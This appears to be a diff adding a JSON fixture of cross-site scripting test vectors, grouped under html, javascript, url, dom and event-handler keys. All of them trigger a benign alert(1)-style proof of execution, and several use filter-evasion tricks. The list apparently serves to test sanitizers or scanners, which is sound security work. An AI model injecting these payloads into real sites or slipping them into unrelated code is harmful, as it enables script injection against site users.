@@ -1,0 +1,62 @@
+{
+  "html": [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<body onload=alert(1)>",
+    "<iframe onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<select autofocus onfocus=alert(1)>",
+    "<textarea autofocus onfocus=alert(1)>",
+    "<keygen autofocus onfocus=alert(1)>",
+    "<video autoplay onloadstart=alert(1)><source src=x>"
+  ],
+  "javascript": [
+    "alert(1)",
+    "confirm(1)",
+    "prompt(1)",
+    "eval('alert(1)')",
+    "setTimeout('alert(1)',100)",
+    "setInterval('alert(1)',100)",
+    "new Function('alert(1)')",
+    "this['alert'](1)",
+    "window['alert'](1)",
+    "self['alert'](1)"
+  ],
+  "url": [
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "vbscript:alert(1)",
+    "javascript:alert(1)//",
+    "javascript:alert(1)/**/",
+    "javascript:alert(1)/*-*/",
+    "javascript:alert(1)/*!*/",
+    "javascript:alert(1)/*--*/",
+    "javascript:alert(1)/**//*/"
+  ],
+  "dom": [
+    "document.write('<script>alert(1)</script>')",
+    "document.body.innerHTML='<script>alert(1)</script>'",
+    "document.body.outerHTML='<script>alert(1)</script>'",
+    "document.documentElement.innerHTML='<script>alert(1)</script>'",
+    "document.documentElement.outerHTML='<script>alert(1)</script>'",
+    "document.createElement('script').text='alert(1)'",
+    "document.createElement('script').innerText='alert(1)'",
+    "document.createElement('script').textContent='alert(1)'",
+    "document.implementation.createHTMLDocument('').write('<script>alert(1)</script>')",
+    "document.write('<img src=x onerror=alert(1)>')"
+  ],
+  "event_handlers": [
+    "onclick=alert(1)",
+    "onmouseover=alert(1)",
+    "onmouseout=alert(1)",
+    "onmouseenter=alert(1)",
+    "onmouseleave=alert(1)",
+    "onmousemove=alert(1)",
+    "onmousedown=alert(1)",
+    "onmouseup=alert(1)",
+    "ondblclick=alert(1)",
+    "oncontextmenu=alert(1)"
+  ]
+}
